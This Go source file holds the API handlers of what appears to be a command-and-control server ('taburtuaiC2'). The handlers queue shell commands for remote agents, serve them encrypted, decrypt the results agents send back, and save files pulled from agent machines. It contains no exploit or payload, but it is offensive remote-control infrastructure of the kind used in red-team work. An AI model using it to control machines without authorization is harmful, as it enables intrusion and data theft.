package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/server/services"
	"github.com/mjopsec/taburtuaiC2/shared/types"
)

// ExecuteCommand queues a command for execution
func (h *Handlers) ExecuteCommand(c *gin.Context) {
	var req struct {
		AgentID    string            `json:"agent_id" binding:"required"`
		Command    string            `json:"command" binding:"required"`
		Args       []string          `json:"args,omitempty"`
		WorkingDir string            `json:"working_dir,omitempty"`
		Timeout    int               `json:"timeout,omitempty"`
		Metadata   map[string]string `json:"metadata,omitempty"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid request: "+err.Error())
		return
	}

	// Verify agent exists and is online
	agent, exists := h.server.Monitor.GetAgent(req.AgentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	if agent.Status != services.StatusOnline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Agent is %s", agent.Status))
		return
	}

	// Create command
	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       req.AgentID,
		Command:       req.Command,
		OperationType: "execute",
		Args:          req.Args,
		WorkingDir:    req.WorkingDir,
		Timeout:       req.Timeout,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Metadata:      req.Metadata,
	}

	if cmd.Timeout == 0 {
		cmd.Timeout = 300 // Default 5 minutes
	}

	// Add to queue
	h.server.CommandQueue.Add(req.AgentID, cmd)
	h.server.Logger.LogCommandExecution(req.AgentID, req.Command, "Queued", true)

	data := map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
	}

	h.APIResponse(c, true, "Command queued successfully", data, "")
}

// GetNextCommand returns next command for agent
func (h *Handlers) GetNextCommand(c *gin.Context) {
	agentID := c.Param("id")

	// Verify agent
	if _, exists := h.server.Monitor.GetAgent(agentID); !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}

	// Get next command
	cmd := h.server.CommandQueue.GetNext(agentID)
	if cmd == nil {
		c.Status(http.StatusNoContent)
		return
	}

	// Encrypt if crypto available
	var responseData interface{} = cmd
	if h.server.CryptoMgr != nil {
		cmdJSON, err := json.Marshal(cmd)
		if err == nil {
			if encrypted, err := h.server.CryptoMgr.EncryptData(cmdJSON); err == nil {
				responseData = map[string]string{"encrypted": encrypted}
			}
		}
	}

	h.APIResponse(c, true, "", responseData, "")
}

// SubmitCommandResult processes command execution result
func (h *Handlers) SubmitCommandResult(c *gin.Context) {
	body, err := c.GetRawData()
	if err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Failed to read request body")
		return
	}

	// Check for encrypted payload
	var encryptedCheck struct {
		EncryptedPayload string `json:"encrypted_payload"`
	}

	if err := json.Unmarshal(body, &encryptedCheck); err == nil && encryptedCheck.EncryptedPayload != "" {
		if h.server.CryptoMgr != nil {
			decrypted, err := h.server.CryptoMgr.DecryptData(encryptedCheck.EncryptedPayload)
			if err != nil {
				c.Status(http.StatusBadRequest)
				h.APIResponse(c, false, "", nil, "Failed to decrypt payload")
				return
			}
			body = decrypted
		}
	}

	var result types.CommandResult
	if err := json.Unmarshal(body, &result); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Invalid result format")
		return
	}

	// Decrypt result fields if needed
	if result.Encrypted && h.server.CryptoMgr != nil {
		if result.Output != "" {
			if decrypted, err := h.server.CryptoMgr.DecryptData(result.Output); err == nil {
				result.Output = string(decrypted)
			}
		}
		if result.Error != "" {
			if decrypted, err := h.server.CryptoMgr.DecryptData(result.Error); err == nil {
				result.Error = string(decrypted)
			}
		}
	}

	// Complete command
	cmd, err := h.server.CommandQueue.CompleteCommand(result.CommandID, &result)
	if err != nil || cmd == nil {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Command not found")
		return
	}

	// Handle download file saving BEFORE logging
	if cmd.OperationType == "download" && cmd.Status == "completed" {
		if cmd.DestinationPath != "" {
			// Create directory if it doesn't exist
			dir := filepath.Dir(cmd.DestinationPath)
			if dir != "." && dir != "" {
				err := os.MkdirAll(dir, 0755)
				if err != nil {
					h.server.Logger.Error(services.SYSTEM,
						fmt.Sprintf("Failed to create directory for download: %v", err),
						cmd.AgentID, "", nil)
				}
			}

			// Save the file
			err = os.WriteFile(cmd.DestinationPath, []byte(result.Output), 0644)
			if err != nil {
				cmd.Error = fmt.Sprintf("Server failed to save file: %v", err)
				cmd.Status = "failed"
				h.server.Logger.Error(services.SYSTEM,
					fmt.Sprintf("Failed to save downloaded file to %s: %v", cmd.DestinationPath, err),
					cmd.AgentID, "", nil)
			} else {
				fileSize := len(result.Output)
				// Update output message to indicate success
				cmd.Output = fmt.Sprintf("File successfully downloaded and saved to %s (%d bytes)",
					cmd.DestinationPath, fileSize)
				h.server.Logger.Info(services.SYSTEM,
					fmt.Sprintf("File downloaded and saved to %s", cmd.DestinationPath),
					cmd.AgentID, "", nil)
			}
		} else {
			h.server.Logger.Warn(services.SYSTEM,
				"Download completed but no destination path specified",
				cmd.AgentID, "", nil)
		}
	}

	// Log result (after file handling so we log the updated output)
	success := cmd.Status == "completed"
	h.server.Logger.LogCommandExecution(cmd.AgentID, cmd.Command, cmd.Output, success)

	// Record metrics
	duration := cmd.CompletedAt.Sub(cmd.ExecutedAt)
	h.server.Monitor.RecordCommand(cmd.AgentID, cmd.Command, success, duration)

	h.APIResponse(c, true, "Command result processed", map[string]interface{}{
		"command_id": cmd.ID,
		"status":     cmd.Status,
		"duration":   duration.String(),
	}, "")
}

// GetCommandStatus returns command status
func (h *Handlers) GetCommandStatus(c *gin.Context) {
	commandID := c.Param("id")

	cmd := h.server.CommandQueue.GetCommand(commandID)
	if cmd == nil {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Command not found")
		return
	}

	// Don't send large file content in status
	cmdCopy := *cmd
	if cmd.OperationType == "upload" || (cmd.OperationType == "download" && len(cmd.Output) > 1024) {
		cmdCopy.FileContent = nil
		if len(cmdCopy.Output) > 1024 {
			cmdCopy.Output = fmt.Sprintf("[File content too large, size: %d bytes]", len(cmd.Output))
		}
	}

	h.APIResponse(c, true, "", cmdCopy, "")
}

// GetAgentCommands returns command history for an agent
func (h *Handlers) GetAgentCommands(c *gin.Context) {
	agentID := c.Param("id")
	status := c.Query("status")
	limit := 50

	if l, err := strconv.Atoi(c.Query("limit")); err == nil && l > 0 {
		limit = l
	}

	commands := h.server.CommandQueue.GetAgentCommands(agentID, status, limit)

	// Clean up large outputs
	var cleanCommands []*types.Command
	for _, cmd := range commands {
		cmdCopy := *cmd
		cmdCopy.FileContent = nil
		if len(cmdCopy.Output) > 256 {
			cmdCopy.Output = cmdCopy.Output[:253] + "..."
		}
		if len(cmdCopy.Error) > 256 {
			cmdCopy.Error = cmdCopy.Error[:253] + "..."
		}
		cleanCommands = append(cleanCommands, &cmdCopy)
	}

	h.APIResponse(c, true, "", map[string]interface{}{
		"commands": cleanCommands,
		"count":    len(cleanCommands),
	}, "")
}

// ClearAgentQueue clears pending commands for an agent
func (h *Handlers) ClearAgentQueue(c *gin.Context) {
	agentID := c.Param("id")

	count := h.server.CommandQueue.ClearQueue(agentID)

	message := fmt.Sprintf("Cleared %d pending commands for agent %s", count, agentID)
	h.server.Logger.Info("AUDIT", message, agentID, "", nil)

	h.APIResponse(c, true, message, nil, "")
}
